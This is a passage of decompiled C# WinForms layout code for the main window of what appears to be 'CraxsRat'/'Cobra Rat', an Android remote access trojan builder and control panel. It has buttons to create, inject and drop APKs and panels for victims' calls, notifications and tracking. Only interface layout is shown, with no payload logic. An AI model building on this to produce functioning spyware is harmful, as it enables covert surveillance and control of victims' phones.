		this.Home_Btn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.Home_Btn.TipsText = "Home";
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(977, 0);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(22, 34);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.StyleCustomMode = true;
		this.DrakeUIButtonIcon2.Symbol = 61802;
		this.DrakeUIButtonIcon2.SymbolSize = 30;
		this.DrakeUIButtonIcon2.TabIndex = 35;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon2, "tutorials");
		this.supportbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.supportbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.supportbtn.FillColor = System.Drawing.Color.Black;
		this.supportbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.supportbtn.Font = new System.Drawing.Font("Calibri", 9f);
		this.supportbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.supportbtn.Location = new System.Drawing.Point(999, 0);
		this.supportbtn.Name = "supportbtn";
		this.supportbtn.RectColor = System.Drawing.Color.Black;
		this.supportbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.supportbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.supportbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.supportbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.supportbtn.Size = new System.Drawing.Size(22, 34);
		this.supportbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.supportbtn.StyleCustomMode = true;
		this.supportbtn.Symbol = 61796;
		this.supportbtn.SymbolSize = 30;
		this.supportbtn.TabIndex = 34;
		this.notifiform.SetToolTip(this.supportbtn, "Support");
		this.DrakeUIButtonIcon13.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon13.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon13.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon13.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon13.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon13.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon13.Location = new System.Drawing.Point(1021, 0);
		this.DrakeUIButtonIcon13.Name = "DrakeUIButtonIcon13";
		this.DrakeUIButtonIcon13.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon13.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon13.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon13.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon13.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon13.Size = new System.Drawing.Size(22, 34);
		this.DrakeUIButtonIcon13.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon13.StyleCustomMode = true;
		this.DrakeUIButtonIcon13.Symbol = 62161;
		this.DrakeUIButtonIcon13.SymbolSize = 30;
		this.DrakeUIButtonIcon13.TabIndex = 33;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon13, "Minimize");
		this.DrakeUIButtonIcon12.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon12.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon12.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon12.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon12.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon12.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon12.Location = new System.Drawing.Point(1043, 0);
		this.DrakeUIButtonIcon12.Name = "DrakeUIButtonIcon12";
		this.DrakeUIButtonIcon12.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon12.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon12.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon12.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon12.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon12.Size = new System.Drawing.Size(22, 34);
		this.DrakeUIButtonIcon12.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon12.StyleCustomMode = true;
		this.DrakeUIButtonIcon12.Symbol = 61527;
		this.DrakeUIButtonIcon12.SymbolSize = 30;
		this.DrakeUIButtonIcon12.TabIndex = 32;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon12, "Exit");
		this.Label1.BackColor = System.Drawing.Color.Black;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Left;
		this.Label1.Font = new System.Drawing.Font("Calibri", 13f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(0, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(8, 34);
		this.Label1.TabIndex = 38;
		this.Label1.Text = "Cobra Rat";
		this.Label1.Visible = false;
		this.Panel3.BackColor = System.Drawing.Color.Black;
		this.Panel3.Controls.Add(this.droperbtn);
		this.Panel3.Controls.Add(this.studiobtn);
		this.Panel3.Controls.Add(this.inject_btn);
		this.Panel3.Controls.Add(this.Build_btn);
		this.Panel3.Controls.Add(this.About_btn);
		this.Panel3.Controls.Add(this.bigtitletext);
		this.Panel3.Controls.Add(this.Label3);
		this.Panel3.Controls.Add(this.PictureBox1);
		this.Panel3.Controls.Add(this.Panel8);
		this.Panel3.Controls.Add(this.Label2);
		this.Panel3.Cursor = System.Windows.Forms.Cursors.SizeAll;
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel3.Location = new System.Drawing.Point(0, 0);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(124, 603);
		this.Panel3.TabIndex = 11;
		this.Settings_btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Settings_btn.Dock = System.Windows.Forms.DockStyle.Top;
		this.Settings_btn.FillColor = System.Drawing.Color.Black;
		this.Settings_btn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.Settings_btn.FillPressColor = System.Drawing.Color.Black;
		this.Settings_btn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.Settings_btn.Font = new System.Drawing.Font("Calibri", 9f);
		this.Settings_btn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Settings_btn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.Settings_btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Settings_btn.Location = new System.Drawing.Point(0, 343);
		this.Settings_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.Settings_btn.RectColor = System.Drawing.Color.Black;
		this.Settings_btn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.Settings_btn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.Settings_btn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.Settings_btn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.Settings_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
		this.Settings_btn.Size = new System.Drawing.Size(124, 40);
		this.Settings_btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Settings_btn.Symbol = 57397;
		this.Settings_btn.SymbolSize = 30;
		this.Settings_btn.TabIndex = 20;
		this.droperbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.droperbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.droperbtn.FillColor = System.Drawing.Color.Black;
		this.droperbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.droperbtn.FillPressColor = System.Drawing.Color.Black;
		this.droperbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.droperbtn.Font = new System.Drawing.Font("Calibri", 9f);
		this.droperbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.droperbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.droperbtn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.droperbtn.Location = new System.Drawing.Point(0, 303);
		this.droperbtn.Name = "droperbtn";
		this.droperbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.droperbtn.RectColor = System.Drawing.Color.Black;
		this.droperbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.droperbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.droperbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.droperbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.droperbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
		this.droperbtn.Size = new System.Drawing.Size(124, 40);
		this.droperbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.droperbtn.Symbol = 61465;
		this.droperbtn.SymbolSize = 30;
		this.droperbtn.TabIndex = 47;
		this.droperbtn.Text = "Drop ApK";
		this.studiobtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.studiobtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.studiobtn.FillColor = System.Drawing.Color.Black;
		this.studiobtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.studiobtn.FillPressColor = System.Drawing.Color.Black;
		this.studiobtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.studiobtn.Font = new System.Drawing.Font("Calibri", 9f);
		this.studiobtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.studiobtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.studiobtn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.studiobtn.Location = new System.Drawing.Point(0, 263);
		this.studiobtn.Name = "studiobtn";
		this.studiobtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.studiobtn.RectColor = System.Drawing.Color.Black;
		this.studiobtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.studiobtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.studiobtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.studiobtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.studiobtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
		this.studiobtn.Size = new System.Drawing.Size(124, 40);
		this.studiobtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.studiobtn.Symbol = 61803;
		this.studiobtn.SymbolSize = 30;
		this.studiobtn.TabIndex = 43;
		this.studiobtn.Text = "ApK Studio";
		this.inject_btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.inject_btn.Dock = System.Windows.Forms.DockStyle.Top;
		this.inject_btn.FillColor = System.Drawing.Color.Black;
		this.inject_btn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.inject_btn.FillPressColor = System.Drawing.Color.Black;
		this.inject_btn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.inject_btn.Font = new System.Drawing.Font("Calibri", 9f);
		this.inject_btn.ForeColor = System.Drawing.Color.SkyBlue;
		this.inject_btn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.inject_btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.inject_btn.Location = new System.Drawing.Point(0, 223);
		this.inject_btn.Name = "inject_btn";
		this.inject_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.inject_btn.RectColor = System.Drawing.Color.Black;
		this.inject_btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inject_btn.RectHoverColor = System.Drawing.Color.White;
		this.inject_btn.RectPressColor = System.Drawing.Color.White;
		this.inject_btn.RectSelectedColor = System.Drawing.Color.White;
		this.inject_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
		this.inject_btn.Size = new System.Drawing.Size(124, 40);
		this.inject_btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inject_btn.Symbol = 61671;
		this.inject_btn.SymbolSize = 30;
		this.inject_btn.TabIndex = 19;
		this.inject_btn.Text = "Inject ApK";
		this.Build_btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Build_btn.Dock = System.Windows.Forms.DockStyle.Top;
		this.Build_btn.FillColor = System.Drawing.Color.Black;
		this.Build_btn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.Build_btn.FillPressColor = System.Drawing.Color.Black;
		this.Build_btn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.Build_btn.Font = new System.Drawing.Font("Calibri", 9f);
		this.Build_btn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Build_btn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.Build_btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Build_btn.Location = new System.Drawing.Point(0, 183);
		this.Build_btn.Name = "Build_btn";
		this.Build_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.Build_btn.RectColor = System.Drawing.Color.Black;
		this.Build_btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Build_btn.RectHoverColor = System.Drawing.Color.White;
		this.Build_btn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.Build_btn.RectSelectedColor = System.Drawing.Color.White;
		this.Build_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
		this.Build_btn.Size = new System.Drawing.Size(124, 40);
		this.Build_btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Build_btn.Symbol = 61819;
		this.Build_btn.SymbolSize = 30;
		this.Build_btn.TabIndex = 18;
		this.Build_btn.Text = "Create ApK";
		this.About_btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.About_btn.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.About_btn.FillColor = System.Drawing.Color.Black;
		this.About_btn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.About_btn.FillPressColor = System.Drawing.Color.Black;
		this.About_btn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.About_btn.Font = new System.Drawing.Font("Calibri", 9f);
		this.About_btn.ForeColor = System.Drawing.Color.SkyBlue;
		this.About_btn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.About_btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.About_btn.Location = new System.Drawing.Point(0, 563);
		this.About_btn.Name = "About_btn";
		this.About_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.About_btn.RectColor = System.Drawing.Color.Black;
		this.About_btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.About_btn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.About_btn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.About_btn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.About_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
		this.About_btn.Size = new System.Drawing.Size(124, 40);
		this.About_btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.About_btn.Symbol = 62108;
		this.About_btn.SymbolSize = 30;
		this.About_btn.TabIndex = 21;
		this.About_btn.Text = "About";
		this.About_btn.Visible = false;
		this.bigtitletext.BackColor = System.Drawing.Color.Black;
		this.bigtitletext.Dock = System.Windows.Forms.DockStyle.Top;
		this.bigtitletext.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.bigtitletext.ForeColor = System.Drawing.Color.SkyBlue;
		this.bigtitletext.Location = new System.Drawing.Point(0, 137);
		this.bigtitletext.Name = "bigtitletext";
		this.bigtitletext.Size = new System.Drawing.Size(124, 46);
		this.bigtitletext.TabIndex = 39;
		this.bigtitletext.Text = "Snake";
		this.bigtitletext.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.Label3.BackColor = System.Drawing.Color.Black;
		this.Label3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label3.Font = new System.Drawing.Font("Calibri", 20f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label3.Location = new System.Drawing.Point(0, 103);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(124, 34);
		this.Label3.TabIndex = 46;
		this.Label3.Text = "Cobra";
		this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.PictureBox1.BackColor = System.Drawing.Color.Black;
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Top;
		this.PictureBox1.Image = Craxs_Rat.My.Resources.Resources.LOGO;
		this.PictureBox1.Location = new System.Drawing.Point(0, 21);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(124, 82);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 15;
		this.PictureBox1.TabStop = false;
		this.Panel8.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel8.Location = new System.Drawing.Point(0, 8);
		this.Panel8.Margin = new System.Windows.Forms.Padding(2);
		this.Panel8.Name = "Panel8";
		this.Panel8.Size = new System.Drawing.Size(124, 13);
		this.Panel8.TabIndex = 39;
		this.Label2.BackColor = System.Drawing.Color.Black;
		this.Label2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label2.Font = new System.Drawing.Font("Calibri", 18f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(0, 0);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(124, 8);
		this.Label2.TabIndex = 43;
		this.Label2.Text = "Cobra";
		this.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label2.Visible = false;
		this.StatusPanel.BackColor = System.Drawing.Color.Black;
		this.StatusPanel.Controls.Add(this.infolowtext);
		this.StatusPanel.Cursor = System.Windows.Forms.Cursors.SizeNS;
		this.StatusPanel.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.StatusPanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.StatusPanel.Location = new System.Drawing.Point(0, 603);
		this.StatusPanel.Name = "StatusPanel";
		this.StatusPanel.Size = new System.Drawing.Size(1189, 15);
		this.StatusPanel.TabIndex = 2;
		this.infolowtext.Cursor = System.Windows.Forms.Cursors.SizeNS;
		this.infolowtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.infolowtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.infolowtext.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.infolowtext.ForeColor = System.Drawing.Color.Lime;
		this.infolowtext.Location = new System.Drawing.Point(0, 0);
		this.infolowtext.Name = "infolowtext";
		this.infolowtext.Size = new System.Drawing.Size(1189, 15);
		this.infolowtext.TabIndex = 4;
		this.infolowtext.Text = "Connected :";
		this.infolowtext.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel1.Location = new System.Drawing.Point(1189, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(8, 618);
		this.Panel1.TabIndex = 21;
		this.ToolTip1.AutomaticDelay = 100;
		this.ToolTip1.BackColor = System.Drawing.Color.Black;
		this.ToolTip1.ForeColor = System.Drawing.Color.SkyBlue;
		this.notifiform.AutomaticDelay = 0;
		this.notifiform.AutoPopDelay = 5000;
		this.notifiform.BackColor = System.Drawing.Color.Black;
		this.notifiform.Font = new System.Drawing.Font("Calibri", 8f, System.Drawing.FontStyle.Bold);
		this.notifiform.ForeColor = System.Drawing.Color.SkyBlue;
		this.notifiform.InitialDelay = 100;
		this.notifiform.OwnerDraw = true;
		this.notifiform.ReshowDelay = 50;
		this.notifiform.TitleFont = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.notifiform.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		this.ToolTips.BackColor = System.Drawing.Color.Black;
		this.ToolTips.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolTips.OwnerDraw = true;
		this.ToolTips.RectColor = System.Drawing.Color.SkyBlue;
		this.checkupdate.Interval = 1000;
		this.Statustimer.Interval = 1000;
		this.Panel10.BackColor = System.Drawing.Color.Black;
		this.Panel10.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel10.Location = new System.Drawing.Point(0, 0);
		this.Panel10.Name = "Panel10";
		this.Panel10.Size = new System.Drawing.Size(8, 626);
		this.Panel10.TabIndex = 22;
		this.Panel15.BackColor = System.Drawing.Color.Black;
		this.Panel15.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel15.Location = new System.Drawing.Point(8, 0);
		this.Panel15.Name = "Panel15";
		this.Panel15.Size = new System.Drawing.Size(1197, 8);
		this.Panel15.TabIndex = 22;
		this.ImageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageList1.ImageStream");
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.ImageList1.Images.SetKeyName(0, "icon.png");
		this.ImageList1.Images.SetKeyName(1, "icon2.png");
		this.ImageList1.Images.SetKeyName(2, "icon3.png");
		this.Timer1.Interval = 60000;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 12f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(1205, 626);
		base.Controls.Add(this.Mainpanel);
		base.Controls.Add(this.Panel15);
		base.Controls.Add(this.Panel10);
		this.DoubleBuffered = true;
		this.ForeColor = System.Drawing.Color.Green;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		this.MaximumSize = new System.Drawing.Size(1205, 626);
		this.MinimumSize = new System.Drawing.Size(1205, 626);
		base.Name = "CraxsRatMain";
		base.Opacity = 0.0;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Cobra";
		base.WindowState = System.Windows.Forms.FormWindowState.Maximized;
		this.Mainpanel.ResumeLayout(false);
		this.infotitlepanel.ResumeLayout(false);
		this.infopanel.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		this.mappanel.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.infobox.ResumeLayout(false);
		this.ReciveBox.ResumeLayout(false);
		this.SentBox.ResumeLayout(false);
		this.RecentBox.ResumeLayout(false);
		this.DashboardPanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.ClientsWindow).EndInit();
		this.ctxmenu.ResumeLayout(false);
		this.MonitorPanel.ResumeLayout(false);
		this.Panel16.ResumeLayout(false);
		this.Panel20.ResumeLayout(false);
		this.FWPANEL.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGFW).EndInit();
		this.FWctx.ResumeLayout(false);
		this.TRKPANEL.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVTRK).EndInit();
		this.TRKctx.ResumeLayout(false);
		this.Panel17.ResumeLayout(false);
		this.recordsShowpanel.ResumeLayout(false);
		this.recordsShowpanel.PerformLayout();
		this.Panel6.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.TCavatar).EndInit();
		this.Panel7.ResumeLayout(false);
		this.serverspanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVSERVS).EndInit();
		this.Panel13.ResumeLayout(false);
		this.notificationspanel.ResumeLayout(false);
		this.callspanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVCALLS).EndInit();
		this.activityzpanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVALRTS).EndInit();
		this.notifispanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVNOTF).EndInit();
		this.Panel12.ResumeLayout(false);
		this.blockpanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVblocked).EndInit();
		this.ctxconnection.ResumeLayout(false);
		this.Panel9.ResumeLayout(false);
		this.connectionpanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DataLog).EndInit();
		this.blockctx.ResumeLayout(false);
		this.Panel11.ResumeLayout(false);
		this.TopPanel.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.StatusPanel.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
